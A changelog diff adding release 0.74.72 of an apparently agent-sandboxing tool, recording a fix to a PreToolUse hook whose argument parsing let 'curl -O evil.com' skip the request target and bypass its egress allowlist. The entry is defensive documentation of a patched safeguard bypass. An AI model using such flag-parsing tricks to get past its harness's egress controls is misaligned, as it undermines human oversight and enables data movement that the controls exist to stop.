@@ -12,6 +12,20 @@ CalVer image tags (`stable-YYYY.MM.N`, `dev-YYYY.MM.N`) are produced for every C
 
 ---
 
+## [0.74.72] - 2026-07-15
+
+### Fixed
+
+- **Security (defense-in-depth):** the PreToolUse hook no longer treats
+  curl's `-O`/`--remote-name` (which takes no argument) as value-consuming,
+  which had let `curl -O evil.com` skip the request target and bypass the
+  hook's egress allowlist. (The VM-level `network.allow_out` policy from
+  0.74.70 still blocked such egress on a configured deployment; this restores
+  the in-sandbox hook layer.) wget's unambiguous `--output-document` stays in
+  the skip set. Follow-up to #847.
+
+---
+
 ## [0.74.71] - 2026-07-14
 
 ### Fixed
